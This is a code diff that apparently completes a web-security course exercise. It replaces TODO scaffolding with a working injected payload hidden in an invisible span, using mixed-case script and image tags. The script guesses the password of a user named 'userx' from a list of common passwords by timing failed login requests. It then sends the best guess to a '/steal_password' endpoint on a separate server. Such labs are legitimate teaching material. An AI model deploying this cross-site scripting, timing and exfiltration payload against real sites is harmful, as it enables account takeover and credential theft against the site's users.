@@ -1,31 +1,32 @@
 <span style='display:none'>
-    <img id='test'/>
-    <script>
-      var dictionary = [`password`, `123456`, `	12345678`, `dragon`, `1234`, `qwerty`, `12345`];
-      var index = 0;
-      var test = document.getElementById(`test`);
-      test.onerror = () => {
-        var end = new Date();
-  
-        /* >>>> HINT: you might want to replace this line with something else. */
-        console.log(`Time elapsed ${end-start}`);
-        /* <<<<< */
-  
-        start = new Date();
-        if (index < dictionary.length) {
-          /* >>>> TODO: replace string with login GET request */
-          test.src = `hello!`;
-          /* <<<< */
-        } else {
-          /* >>>> TODO: analyze server's reponse times to guess the password for userx and send your guess to the server <<<<< */
-        }
-        index += 1;
-      };
-      var start = new Date();
-      /* >>>> TODO: replace string with login GET request */
-      test.src = `hello!`;
-      /* <<<< */
+  <Img id='test'/>
+  <Script>
+    var dictionary = [`password`, `123456`, `	12345678`, `dragon`, `1234`, `qwerty`, `12345`];
+    var index = 0;
+    var test = document.getElementById(`test`);
+    var correct_index = 0;
+    var correct_time = 0;
+    test.onerror = () => {
+      var end = new Date();
+
+      let session_time = end - start;
+      if (session_time > correct_time) {
+        correct_time = session_time;
+        correct_index = index - 1;
+      }
+
+      start = new Date();
+      if (index < dictionary.length) {
+        test.src = `/get_login?username=userx&password=`.concat(dictionary[index]);
+      } else {
+        let steal_pwd_req = new XMLHttpRequest();
+        steal_pwd_req.open(`GET`, `http://localhost:3000/steal_password?password=`.concat(dictionary[correct_index]).concat(`&timeElapsed=`).concat(correct_time));
+        steal_pwd_req.send();
+      }
       index += 1;
-    </script>
-  </span>
-  
+    };
+    var start = new Date();
+    test.src = `/get_login?username=userx&password=`.concat(dictionary[index]);
+    index += 1;
+  </Script>
+</span>
